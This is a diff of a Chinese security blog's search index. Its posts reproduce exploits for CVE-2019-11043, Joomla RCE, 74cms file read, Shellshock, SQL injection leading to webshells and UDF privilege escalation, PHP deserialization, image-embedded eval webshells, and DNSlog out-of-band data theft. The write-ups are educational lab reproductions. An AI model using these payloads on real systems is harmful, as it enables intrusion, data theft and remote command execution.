img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 资源分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 资源分享 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CVE-2019-11043复现</title>
+      <link href="/archives/78f531e0/"/>
+      <url>/archives/78f531e0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。</p><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里直接使用p牛的docker环境进行复现</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md" target="_blank" rel="noopener">PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</a></p><h6 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h6><pre><code>apt install docker docker-compose </code></pre><h6 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h6><pre><code>systemctl start docker</code></pre><h6 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h6><pre><code>git clone https://github.com/vulhub/vulhub.gitcd vulhub/php/CVE-2019-11043docker-compose up -d</code></pre><p>在启动环境前建议先设置镜像加速</p><p>在 /etc/docker/daemon.json 写入以下内容（如果不存在文件，请新建）</p><pre><code>{"registry-mirrors":["https://registry.docker-cn.com"]}</code></pre><p>以上是添加 docker 官方提供的中国镜像，也可以选择使用阿里云，中科大等镜像。添加镜像后需要重启docker</p><pre><code>sudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><p><img src="https://i.loli.net/2019/10/29/jR5z9rEof6Jvsgh.png" alt=""></p><p>看到上面的界面代表环境启动成功，默认页面在<a href="http://127.0.0.1:8080/index.php" target="_blank" rel="noopener">http://127.0.0.1:8080/index.php</a></p><p><img src="https://i.loli.net/2019/10/29/YTiLtIS8RGwcuzP.png" alt=""></p><p>不想搭建的可使用我搭建的在线环境</p><p> <a href="http://45.147.200.196:8080/index.php" target="_blank" rel="noopener">http://45.147.200.196:8080/index.php</a> </p><h6 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h6><p>安装golang，git代码并编译</p><pre><code>apt install golanggit clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdamgo get -vgo build</code></pre><p><img src="https://i.loli.net/2019/10/29/q1FviSD6Jn2mLfj.png" alt=""></p><p>运行</p><pre><code>go run . "http://127.0.0.1:8080/index.php"</code></pre><p><img src="https://i.loli.net/2019/10/29/TFlHUvW5hXAfCrB.png" alt=""></p><p>验证</p><p><img src="https://i.loli.net/2019/10/29/DsackPLWy9COMoE.png" alt=""></p><p>因为php-fpm会启动多个子进程，在访问<code>/index.php?a=id</code>时需要多访问几次，以访问到被污染的进程 </p><p>复现完后建议删除或停止容器</p><pre><code>docker ps //查看正在运行容器 docker stop containerId //containerId是容器的ID docker ps -a //查看所有容器 docker ps -a -q //查看所有容器ID docker stop $(docker ps -a -q) //停止所有容器 docker rm $(docker ps -a -q) //删除所有容器</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入以及UDF提权</title>
+      <link href="/archives/27651eb5/"/>
+      <url>/archives/27651eb5/</url>
+      
+        <content type="html"><![CDATA[<p><strong>熊海CMS的SQL注入以及后续的UDF提权</strong><a id="more"></a></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>后台登录界面存在sql注入，可抓包后放到sqlmap跑<img src="https://i.loli.net/2019/10/28/EQmeRBvlMpLbo9a.png" alt=""></p><p>可获取到管理员密码</p><pre><code>sqlmap -r 1.txt -D isea -T manage -C name,password --dump</code></pre><p><img src="https://i.loli.net/2019/10/28/OcJSzXi1tBlGWf9.png" alt=""></p><p>登陆到后台后还存在union联合注入</p><pre><code>http://10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,8,9,10--+</code></pre><p><img src="https://i.loli.net/2019/10/28/JpGQmZsozfcMS4j.png" alt=""></p><p>构造注入语句</p><pre><code>http://10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,version(),user(),@@datadir,5,database(),7,password,9,10 from manage--+</code></pre><p><img src="https://i.loli.net/2019/10/28/afdbNP5roHG7jwU.png" alt=""></p><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>通过sqlmap读取配置文件获取网站绝对路径</p><pre><code>sqlmap -r 1.txt --file-read /etc/httpd/conf/httpd.conf</code></pre><p><img src="https://i.loli.net/2019/10/28/kiuISv2Kxoc9Mnr.png" alt=""></p><p>也可构造load_file()读取文件</p><pre><code>http://10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,load_file('/etc/httpd/conf/httpd.conf'),9,10--+</code></pre><p><img src="https://i.loli.net/2019/10/28/UQXgjxoNWD14e8f.png" alt=""></p><h6 id="获取到绝对路径后可以使用sqlmap获取os-shell"><a href="#获取到绝对路径后可以使用sqlmap获取os-shell" class="headerlink" title="获取到绝对路径后可以使用sqlmap获取os-shell"></a>获取到绝对路径后可以使用sqlmap获取os-shell</h6><p>PS:获取到绝对路径后并没根目录的权限，但子目录有权限</p><p><img src="https://i.loli.net/2019/10/28/VhPavUCYJzTDp1O.png" alt=""></p><pre><code>sqlmap -r 1.txt --os-shell     </code></pre><p><img src="https://i.loli.net/2019/10/28/KjVMJHvdeyq13Fz.png" alt=""></p><p>输入网站类型和路径，即可获取os-shell</p><p><img src="https://i.loli.net/2019/10/28/WAbHmzN1dcyGYwa.png" alt=""></p><p>sqlmap会上传两个页面，前者为文件上传，后者为命令执行执行</p><p><img src="https://i.loli.net/2019/10/28/YfMyDHwOKrIG4Z3.png" alt="前者"></p><p><img src="https://i.loli.net/2019/10/28/IQHG2kfqnND18Wm.png" alt="后者"></p><p>可以利用文件上传页面上传其他shell，获得更好的体验</p><h6 id="或者构造into-outfile写shell"><a href="#或者构造into-outfile写shell" class="headerlink" title="或者构造into outfile写shell"></a>或者构造into outfile写shell</h6><pre><code>http://10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,8,'&lt;?php phpinfo();?&gt;',10 into outfile '/var/www/html/xcxmiku/images/xcx.php'--+</code></pre><p><img src="https://i.loli.net/2019/10/28/4MOEnLU1o28DNZB.png" alt=""></p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>此时shell的权限为 apache <img src="https://i.loli.net/2019/10/28/sNPFq6QWzpvMykT.png" alt=""></p><p>使用UDF提权可将将MYSQL账号root转化为系统system权限，从而执行系统任意命令 </p><h6 id="UDF获取"><a href="#UDF获取" class="headerlink" title="UDF获取"></a>UDF获取</h6><p>在msf的/usr/share/metasploit-framework/data/exploits/mysql目录下</p><p><img src="https://i.loli.net/2019/10/28/wJteD3chuvo2mYC.png" alt=""></p><p>也可在<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" target="_blank" rel="noopener">github</a>上获取</p><p>dll对应Windows，so对应Linux</p><p>使用sqlmap –sql-shell 获取 mysql root密码</p><p>5.6及以下版本执行</p><pre><code>select host,user,password from mysql.user;</code></pre><p>5.7及以上版本执行</p><pre><code>select host,user,authentication_string from mysql.user;</code></pre><p><img src="https://i.loli.net/2019/10/28/Bik34rAhfHEOuTw.png" alt=""></p><p>我这里为空密码</p><p>使用蚁剑连接数据库获取必要信息</p><pre><code>select @@version_compile_machine,@@plugin_dir;</code></pre><p><img src="https://i.loli.net/2019/10/28/upzlc9hDC1bw5UV.png" alt=""></p><p>操作系统为64位，Plugin文件夹 在/usr/lib64/mysql/plugin</p><h6 id="UDF上传"><a href="#UDF上传" class="headerlink" title="UDF上传"></a>UDF上传</h6><p>使用蚁剑将 lib_mysqludf_sys_64.so 上传至 /usr/lib64/mysql/plugin</p><p><img src="https://i.loli.net/2019/10/28/qpBoUnaY63bMg5L.png" alt=""></p><p>安装UDF</p><pre><code>create function sys_eval returns string soname 'lib_mysqludf_sys_64.so';</code></pre><p><img src="https://i.loli.net/2019/10/28/ea6oKxGQXcYlkb1.png" alt=""></p><p>这里我们选择sys_eval函数，此函数可执行系统命令并回显</p><p>验证</p><pre><code>select * from mysql.func where name = 'sys_eval';</code></pre><p><img src="https://i.loli.net/2019/10/28/E2xOmUy1vaWu3VY.png" alt=""></p><p>利用</p><pre><code>select sys_eval('whoami');</code></pre><p><img src="https://i.loli.net/2019/10/28/XKLWDGoQNv9EH5a.png" alt=""></p><p>通过sys_eval即可执行任意系统命令</p><p>PS: 记得用完删除文件和udf定义，删除语句为drop function sys_eval;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Joomla3.4.6-RCE漏洞复现</title>
+      <link href="/archives/604d2f58/"/>
+      <url>/archives/604d2f58/</url>
+      
+        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>源码下载地址</p><pre><code>https://github.com/joomla/joomla-cms/releases/tag/3.4.6https://downloads.joomla.org/it/cms/joomla3/3-4-6 </code></pre><p> 我这边直接使用了phpstudy</p><p><img src="https://i.loli.net/2019/10/23/Kmkp3qgMayu6rZf.png" alt=""> </p><p><img src="https://i.loli.net/2019/10/23/gcO72WNJht5eRBT.png" alt=""></p><p>这里需要提前新建数据库，然后直接安装即可。</p><p><img src="https://i.loli.net/2019/10/23/C9WxVTsIi7Pjop3.png" alt=""></p><p> 安装完成后的默认后台地址为</p><pre><code>http://127.0.0.1/joomla/administrator/</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>POC在这里</p><pre><code> https://github.com/kiks7/rusty_joomla_rce</code></pre><h6 id="使用python进行漏洞检测"><a href="#使用python进行漏洞检测" class="headerlink" title="使用python进行漏洞检测"></a>使用python进行漏洞检测</h6><pre><code>python rusty_joomla_exploit.py -t http://10.1.1.11/joomla/ -c   </code></pre><p><img src="https://i.loli.net/2019/10/23/tOe7n5WLQy8UP6i.png" alt=""></p><h6 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h6><p><img src="https://i.loli.net/2019/10/23/HXMYL6n7WOueD5A.png" alt=""></p><p>反弹shell失败，但是在 configuration.php 写入了一句话木马，使用蚁剑连接</p><p><img src="https://i.loli.net/2019/10/23/Ns2j8I1Rbh4SAdT.png" alt=""></p><p>可getshell</p><h6 id="使用msf进行漏洞检测"><a href="#使用msf进行漏洞检测" class="headerlink" title="使用msf进行漏洞检测"></a>使用msf进行漏洞检测</h6><p>将metasploit_rusty_joomla_rce放到/usr/share/metasploit-framework/modules/exploits/multi/php/</p><pre><code>cp metasploit_rusty_joomla_rce.rb /usr/share/metasploit-framework/modules/exploits/multi/php/</code></pre><p>然后在 msfconsole 里 reload_all 再搜索 joomla </p><p><img src="https://i.loli.net/2019/10/23/5OosHyXm6iJVrkw.png" alt=""></p><p>选择模块并查看参数</p><p><img src="https://i.loli.net/2019/10/23/Kd4JqNcDm9fY1jM.png" alt=""></p><p>设置参数进行攻击</p><p><img src="https://i.loli.net/2019/10/23/KwhXSxFQZukpLGO.png" alt=""></p><p>还需设set verbose true</p><p><img src="https://i.loli.net/2019/10/23/m8uAOQiI9sYyLWN.png" alt=""></p><p>能获取到漏洞所需要的信息，但却还是利用失败，原因未知。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>74cms v4.2.3任意文件读取</title>
+      <link href="/archives/b5945507/"/>
+      <url>/archives/b5945507/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于漏洞的分析请看这篇文章<a href="https://balis0ng.com/post/dai-ma-shen-ji/2017-07-05" target="_blank" rel="noopener">74cms v4.2.3前台任意文件读取</a>，大佬分析的很详细，我这里不作分析，仅复现漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先尝试读取 db.php，向服务器post如下数据</p><pre><code>POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1Host: 10.1.1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveCookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmikuContent-Type: application/x-www-form-urlencodedajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre><p>会返回如下数据</p><p><img src="https://i.loli.net/2019/10/21/NPhFWOcK6wd3TQA.png" alt=""></p><p> 在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p><p><img src="https://i.loli.net/2019/10/21/NitTmDKRWvFMUJ6.png" alt=""></p><p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp Suite上返回的时间转换为时间戳</p><p><img src="https://i.loli.net/2019/10/21/aBcimVp8erndODU.png" alt=""></p><p>不过这个时间可能会有误差，如果不行就把时间+-10</p><p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p><p><img src="https://i.loli.net/2019/10/21/WuoP3xDBIOgrHQE.png" alt=""></p><p>成功获取图片名，然后访问 10.1.1.1/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg ，保存该图片用文本打开就是 db.php 的内容。</p><h6 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h6><p>在没有Burp Suite的情况下可以直接使用<a href="http://coolaf.com/" target="_blank" rel="noopener">在线ＰＯＳＴ</a>，参数如下</p><p><img src="https://i.loli.net/2019/10/22/rQOT4Nw5ZIgC3o2.png" alt=""></p><p>在Header可获取到时间戳</p><p><img src="https://i.loli.net/2019/10/22/Htl8Le2sYUIT9Nx.png" alt=""></p><h2 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h2><h6 id="post数据返回unicode编码"><a href="#post数据返回unicode编码" class="headerlink" title="post数据返回unicode编码"></a>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p><h6 id="读取其他文件"><a href="#读取其他文件" class="headerlink" title="读取其他文件"></a>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p><p>是读取db.php，如果想读取根目录可以构造</p><p>../../../../../../../../etc/passwd</p><h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CMS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>简单的PHP反序列化</title>
+      <link href="/archives/f8e3d21b/"/>
+      <url>/archives/f8e3d21b/</url>
+      
+        <content type="html"><![CDATA[<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre><code>&lt;?phpclass test{    public $xcx;    public $miku;    function __destruct(){       $a = $this-&gt;xcx;       $a($this-&gt;miku);    }}unserialize($_POST['qq']);?&gt;</code></pre><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码上的 function __destruct是析构函数，会在 销毁一个类之前执行的一些操作或完成一些功能 。</p><p>因上面将xcx赋值给a，再将miku放进a执行，可以根据这个构造出命令执行的序列化</p><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><pre><code>&lt;?phpclass test{    public $xcx = 'system';    public $miku = 'whoami';    function __destruct(){       $a = $this-&gt;xcx;       $a($this-&gt;miku);    }}$b = new test();echo serialize($b);?&gt;</code></pre><p>将输出的值以POST形式传参，会返回whoami的结果</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XML外部实体注入(XXE)</title>
+      <link href="/archives/81510889/"/>
+      <url>/archives/81510889/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.</p><p>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果构造特殊的实体就可以做到任意文件读取。</p><p>想了解XXE可以去看先知社区的这篇文章<a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a>。</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>抓包某登录框，发现是使用XML传输切会回显登录用户名</p><p><img src="https://i.loli.net/2019/10/28/XuiFc5BDROknwpe.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>构建外部实体读取etc/passwd成功</p><p><img src="https://i.loli.net/2019/10/28/6bYKjNZfDOJ4L5P.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> XXE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>凡诺CMS文件包含漏洞</title>
+      <link href="/archives/b0c3a4a4/"/>
+      <url>/archives/b0c3a4a4/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/10/28/BZEiyAfn6vCF8OD.png" alt="文件包含8.png"></p><p>在后台添加频道处可以上传图片和附件，可以上传图片或上传以下格式的附件</p><p><img src="https://i.loli.net/2019/10/28/N2Vy1WZzpvDERY7.png" alt=""></p><p>图片马的制作在上篇<a href="https://xcxmiku.github.io/2019/10/15/LFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank" rel="noopener">文章</a>说过，这里我将冰蝎马改名为shell.doc进行上传，上传后会回显文件地址。</p><p><img src="https://i.loli.net/2019/10/28/jDT5OdbHMoIPure.png" alt=""></p><p>然后将回显的文件地址填在频道模板处，在地址前面加上../../（用于跳出文件目录）</p><p><img src="https://i.loli.net/2019/10/28/BlRUQC8MEidTwaJ.png" alt=""></p><p>设置频道名称后添加频道，在首页找到添加的频道打开</p><p><img src="https://i.loli.net/2019/10/28/R4uBDmyFlXGCVns.png" alt=""></p><p>页面并没有显示任何东西，因为被当成PHP解析了。</p><p>使用冰蝎连接即可getshell！</p><p><img src="https://i.loli.net/2019/10/28/fqK3x4MarVvlo6Z.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>LFI本地文件包含</title>
+      <link href="/archives/2eda3969/"/>
+      <url>/archives/2eda3969/</url>
+      
+        <content type="html"><![CDATA[<p><strong>LFI(Local File Inclusion)</strong><br>本地文件包含漏洞，指的是服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，利用这个特性，配合文件上传就可以getshell。</p><p>已知服务器存在文件包含且存在上传点</p><p><img src="https://i.loli.net/2019/10/28/PEFt7A4zhejvCrT.png" alt=""></p><p>只能上传图片，可制作图片一句话木马进行上传</p><p>在Windows可以通过cmd制作一句话木马。</p><p>命令为</p><pre><code>copy 1.jpg/b+2.php/a 3.jpg</code></pre><p>参数/b指定以二进制格式复制、合并文件。用于图像类/声音类文件</p><p>参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件</p><p>这条命令就是把j1.pg和2.php合并到一起，生成3.jpg</p><p>Linux/Macos下通过终端制作</p><p>命令为 </p><pre><code>cat 1.php &gt;&gt; 2.jpg </code></pre><p>这句命令是将1.php追加到2.jpg里面</p><p>如果是两个文件合并生成第三个</p><p>命令为 </p><pre><code>cat 1.php 2.jpg &gt;&gt; 3.jpg </code></pre><p>PHP一句话 </p><pre><code>&lt;?php eval(@$_POST['xcx']); ?&gt; </code></pre><p><img src="https://i.loli.net/2019/10/28/nbHKW8wAzc5efCg.png" alt=""></p><p>上传图片马</p><p><img src="https://i.loli.net/2019/10/28/OSp7EcsZQwvIG9V.png" alt=""></p><p>利用文件包含</p><p><img src="https://i.loli.net/2019/10/28/AsC3XSg48rGfWTF.png" alt=""></p><p>可看到图片被解析成了PHP（因为被解析了所以不会显示一句话木马）</p><p>使用蚁剑连接</p><p><img src="https://i.loli.net/2019/10/28/i9QhcJI3vAtoEsg.png" alt=""></p><p>成功getshell</p><p><img src="https://i.loli.net/2019/10/28/bdesIZP6pYgEzaG.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>破壳漏洞（CVE-2014-6271）</title>
+      <link href="/archives/7dc46b66/"/>
+      <url>/archives/7dc46b66/</url>
+      
+        <content type="html"><![CDATA[<p>linux下可以直接使用curl进行复现，命令如下 </p><pre><code>curl -A ' () { :;};echo ;  echo $(/bin/ls /);' 'http://www.*****.com/cgi-bin/poc.cgi' </code></pre><p><img src="https://i.loli.net/2019/10/28/cJipDq98KvAQ7LP.png" alt=""></p><p>Windows下可使用Burp Suite</p><p>将User-Agent改为() { :;};echo ;  echo $(/bin/ls /);</p><p><img src="https://i.loli.net/2019/10/28/4y8TzkoZWEH3Pe6.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>记一次dnslog注入</title>
+      <link href="/archives/9437e8fc/"/>
+      <url>/archives/9437e8fc/</url>
+      
+        <content type="html"><![CDATA[<p>DNSlog辅助平台</p><p><a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a> 需注册</p><p><a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a> 无需注册</p><h4 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h4><pre><code>http://www/index.php?id=1 and if((select load_file(concat('\\\\',(select database()),'.aksgyv.dnslog.cn\\abc'))),0,1)</code></pre><h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><pre><code>http://www/index.php?id=1 and if((select load_file(concat('\\\\',(select group_concat(table_name) from information_schema.tables where table_schema='dnslog'),'.aksgyv.dnslog.cn\\abc'))),0,1)</code></pre><h4 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h4><pre><code>http://www/index.php?id=1 and if((select load_file(concat('\\\\',(select group_concat(column_name)from information_schema.columns where table_name='flag_is_here'),'.aksgyv.dnslog.cn\\abc'))),0,1)</code></pre><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><pre><code>http://www./index.php?id=1 and if((select load_file(concat('\\\\',(select flag from flag_is_here),'.aksgyv.dnslog.cn\\abc'))),0,1)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
